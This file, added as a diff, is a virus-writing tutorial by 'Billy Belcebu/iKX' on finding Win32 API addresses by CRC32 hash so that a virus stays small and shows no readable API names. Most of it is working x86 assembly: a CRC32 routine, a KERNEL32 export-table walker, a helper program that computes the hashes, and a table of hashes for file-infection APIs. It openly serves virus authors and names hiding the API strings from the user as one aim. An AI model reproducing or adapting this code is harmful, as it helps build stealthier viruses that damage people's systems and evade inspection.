@@ -1,0 +1,334 @@
+
+
+
+                         Advanced API search engine
+                               by using CRC32
+
+
+
+ Well, we  all know (or i expect this) how to code an API search engine... it
+ is preety easy, and you have  many tutorials to  choose (JHB's, Lord Julus',
+ my own tutorial...), just get  one and  study it. But, as you  realized, the
+ API  addresses occupy (let's  say WASTE) many  bytes of  your virus. How  to
+ solve this problem if you want to code a small virus? 
+
+ [ The solution: CRC32 ]
+
+ I believe that  GriYo was the first to use this technique, in his impressive
+ Win32.Parvo  virus (sources not  released yet). It  consists  in, instead of
+ searching for a determinated amount  of bytes that matches  exactly with the
+ API name we have in our code, get all the API names, one  after another, and
+ retrieve their CRC32, and compare it with  the CRC32 of the API we are sear-
+ ching for. If it's equal, then we must proceed as always. Ok, ok... first of
+ all you need some code for  get the CRC32 :) Let's get Zhengxi's code, remi-
+ xed firstly by Vecna, and finally remixed by me (optimized few bytes) ;)
+
+;ÄÄÄ[ CUT HERE ]ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+;
+; CRC32 procedure
+;  ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
+;
+; input:
+;	 ESI = Offset where code to calculate begins
+;	 EDI = Size of that code
+; output:
+;	 EAX = CRC32 of	given code
+;
+
+ CRC32          proc
+        cld
+        xor     ecx,ecx                         ; Optimized by me - 2 bytes
+        dec     ecx                             ; less
+        mov     edx,ecx
+ NextByteCRC:
+        xor     eax,eax
+        xor     ebx,ebx
+        lodsb
+        xor     al,cl
+        mov     cl,ch
+        mov     ch,dl
+        mov     dl,dh
+        mov     dh,8
+ NextBitCRC:
+        shr     bx,1
+        rcr     ax,1
+        jnc     NoCRC
+        xor     ax,08320h
+        xor     bx,0EDB8h
+ NoCRC: dec     dh
+        jnz     NextBitCRC
+        xor     ecx,eax
+        xor     edx,ebx
+        dec     edi                             ; 1 byte less
+        jnz     NextByteCRC
+        not     edx
+        not     ecx
+        mov     eax,edx
+        rol     eax,16
+        mov     ax,cx
+        ret
+ CRC32          endp
+;ÄÄÄ[ CUT HERE ]ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+
+ Well, we now know how to get the fucking CRC32 of a determinated string and/
+ or code, but you are  expecting here another thing... hehehehe, yeah! you're
+ waiting for the code of the API search engine :) 
+
+;ÄÄÄ[ CUT HERE ]ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+;
+; GetAPI_ET_CRC32 procedure
+;  ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
+;
+; Heh, hard name? Well, this procedure searches for an API name in the Export
+; Table of  KERNEL32 (a little  changes would make  it  work on any DLL), but
+; only needing the CRC32 of the API, not the complete string :) Requires also
+; a routine for obtain CRC32 as the one i presented above.
+;
+; input:
+;        EAX = CRC32 of the API ASCIIz name
+; output:
+;	 EAX = API address
+;
+
+ GetAPI_ET_CRC32 proc
+        xor     edx,edx
+        xchg    eax,edx                         ; Put CRC32 of da api in EDX
+        mov     word ptr [ebp+Counter],ax       ; Reset counter
+        mov     esi,3Ch
+        add     esi,[ebp+kernel]                ; Get PE header of KERNEL32
+        lodsw
+        add     eax,[ebp+kernel]                ; Normalize
+
+        mov     esi,[eax+78h]                   ; Get a pointer to its 
+        add     esi,1Ch                         ; Export Table
+        add     esi,[ebp+kernel]
+
+        lea     edi,[ebp+AddressTableVA]        ; Pointer to the address table
+        lodsd                                   ; Get AddressTable value
+        add     eax,[ebp+kernel]                ; Normalize
+        stosd                                   ; And store in its variable
+
+        lodsd                                   ; Get NameTable value
+        add     eax,[ebp+kernel]                ; Normalize
+        push    eax                             ; Put it in stack
+        stosd                                   ; Store in its variable
+
+        lodsd                                   ; Get OrdinalTable value
+        add     eax,[ebp+kernel]                ; Normalize
+        stosd                                   ; Store
+
+        pop     esi                             ; ESI = NameTable VA
+
+ @?_3:  push    esi                             ; Save again
+        lodsd                                   ; Get pointer to an API name
+        add     eax,[ebp+kernel]                ; Normalize
+        xchg    edi,eax                         ; Store ptr in EDI
+        mov     ebx,edi                         ; And in EBX
+
+        push    edi                             ; Save EDI
+        xor     al,al                           ; Reach the null character
+        scasb                                   ; that marks us the end of 
+        jnz     $-1                             ; the api name
+        pop     esi                             ; ESI = Pointer to API Name
+
+        sub     edi,ebx                         ; EDI = API Name size
+
+        push    edx                             ; Save API's CRC32
+        call    CRC32                           ; Get actual api's CRC32
+        pop     edx                             ; Restore API's CRC32
+        cmp     edx,eax                         ; Are them equal?
+        jz      @?_4                            ; if yes, we got it
+
+        pop     esi                             ; Restore ptr to api name
+        add     esi,4                           ; Get the next
+        inc     word ptr [ebp+Counter]          ; And increase the counter
+        jmp     @?_3                            ; Get another api!
+ @?_4:
+        pop     esi                             ; Remove shit from stack
+        movzx   eax,word ptr [ebp+Counter]      ; AX = Counter
+        shl     eax,1                           ; *2 (it's an array of words)
+        add     eax,dword ptr [ebp+OrdinalTableVA] ; Normalize
+        xor     esi,esi                         ; Clear ESI
+        xchg    eax,esi                         ; ESI = Ptr 2 ordinal; EAX = 0
+        lodsw                                   ; Get ordinal in AX
+        shl     eax,2                           ; And with it we go to the
+        add     eax,dword ptr [ebp+AddressTableVA] ; AddressTable (array of
+        xchg    esi,eax                         ; dwords)
+        lodsd                                   ; Get Address of API RVA
+        add     eax,[ebp+kernel]                ; and normalize!! That's it!
+        ret
+ GetAPI_ET_CRC32 endp
+
+ AddressTableVA dd      00000000h               ;\
+ NameTableVA    dd      00000000h               ; > IN THIS ORDER!!
+ OrdinalTableVA dd      00000000h               ;/
+
+ kernel         dd      0BFF70000h              ; Adapt it to your needs ;)
+ Counter        dw      0000h
+;ÄÄÄ[ CUT HERE ]ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+
+ Happy? Yeah, it rocks and it's easy! And, of course, you  can avoid the sus-
+ picions of the user if your virus is unencrypted, because there are no visi-
+ ble API names :) Well, i will  list  some CRC32 of  some APIs (including the
+ null character of the end of the API), but if  you want  to use  another API
+ rather than the ones i will list here, i will also put a little program that
+ gives you the CRC32 of an ASCIIz string. 
+
+ [ CRC32 of some APIs ]
+
+ API name               CRC32
+ ÄÄÄÄÄÄÄÄ               ÄÄÄÄÄ
+ CreateFileA            08C892DDFh
+ CloseHandle            068624A9Dh
+ FindFirstFileA         0AE17EBEFh
+ FindNextFileA          0AA700106h
+ FindClose              0C200BE21h
+ CreateFileMappingA     096B2D96Ch
+ GetModuleHandleA       082B618D4h
+ GetProcAddress         0FFC97C1Fh
+ MapViewOfFile          0797B49ECh
+ UnmapViewOfFile        094524B42h
+ GetFileAttributesA     0C633D3DEh
+ SetFileAttributesA     03C19E536h
+ ExitProcess            040F57181h
+ SetFilePointer         085859D42h
+ SetEndOfFile           059994ED6h
+
+ [ Do you want any other API? ]
+
+ Well, it's possible that you will need to know some CRC32 of another API na-
+ mes, so here i will put the little, shitty, but effective program that i ma-
+ de for help myself, and i hope it will help you too.
+
+;ÄÄÄ[ CUT HERE ]ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+
+        .586
+        .model  flat
+        .data
+
+ extrn          ExitProcess:PROC
+ extrn          MessageBoxA:PROC
+ extrn          GetCommandLineA:PROC
+
+ titulo         db "GetCRC32 by Billy Belcebu/iKX",0
+
+ message        db "SetEndOfFile"               ; Put here the string you
+                                                ; want to know its CRC32
+ _              db 0
+                db "CRC32 is "
+ crc32_         db "00000000",0
+
+        .code
+
+ test:
+        lea     edi,message                     ; Search until 0
+        xor     al,al
+        scasb
+        jnz     $-1
+        sub     edi,offset message              ; Get API name size
+        lea     esi,message                     ; Load pointer to API name
+        call    CRC32                           ; Get its CRC32
+
+        lea     edi,crc32_                      ; Transform hex to text
+        call    HexWrite32
+
+        mov     _," "                           ; make 0 to be an space
+
+        push    00000000h                       ; Display message box with
+        push    offset titulo                   ; the API name and its CRC32
+        push    offset message
+        push    00000000h
+        call    MessageBoxA
+
+        push    00000000h
+        call    ExitProcess
+
+ HexWrite8      proc                            ; This code has been taken
+        mov     ah,al                           ; from the 1st generation
+        and     al,0Fh                          ; host of Bizatch
+        shr     ah,4
+        or      ax,3030h
+        xchg    al,ah
+        cmp     ah,39h
+        ja      @@4
+ @@1:
+        cmp     al,39h
+        ja      @@3
+ @@2:
+        stosw
+        ret
+ @@3:
+        sub     al,30h
+        add     al,'A' - 10
+        jmp     @@2
+ @@4:
+        sub     ah,30h
+        add     ah,'A' - 10
+        jmp     @@1
+ HexWrite8      endp
+
+ HexWrite16     proc
+        push    ax
+        xchg    al,ah
+        call    HexWrite8
+        pop     ax
+        call    HexWrite8
+        ret
+ HexWrite16     endp
+
+ HexWrite32     proc
+        push    eax
+        shr     eax, 16
+        call    HexWrite16
+        pop     eax
+        call    HexWrite16
+        ret
+ HexWrite32     endp
+
+ CRC32          proc
+        cld
+        xor     ecx,ecx                         ; Optimized by me - 2 bytes
+        dec     ecx                             ; less
+        mov     edx,ecx
+ NextByteCRC:
+        xor     eax,eax
+        xor     ebx,ebx
+        lodsb
+        xor     al,cl
+        mov     cl,ch
+        mov     ch,dl
+        mov     dl,dh
+        mov     dh,8
+ NextBitCRC:
+        shr     bx,1
+        rcr     ax,1
+        jnc     NoCRC
+        xor     ax,08320h
+        xor     bx,0EDB8h
+ NoCRC: dec     dh
+        jnz     NextBitCRC
+        xor     ecx,eax
+        xor     edx,ebx
+        dec     edi                             ; 1 byte less
+        jnz     NextByteCRC
+        not     edx
+        not     ecx
+        mov     eax,edx
+        rol     eax,16
+        mov     ax,cx
+        ret
+ CRC32          endp
+
+ end    test
+;ÄÄÄ[ CUT HERE ]ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+
+ This little program could be used for any string you want. Enjoy it!
+
+ [ Good-byes ]
+
+ Well, i  sincerely hope that this  little and  simple tutorial helped you in
+ your needs of use a great  amount  of  APIs and a  little amount of bytes :)
+ If you have any problem, just mail me.
+
+ I am the way: prepare for salvation,
+ Billy Belceb£/iKX.
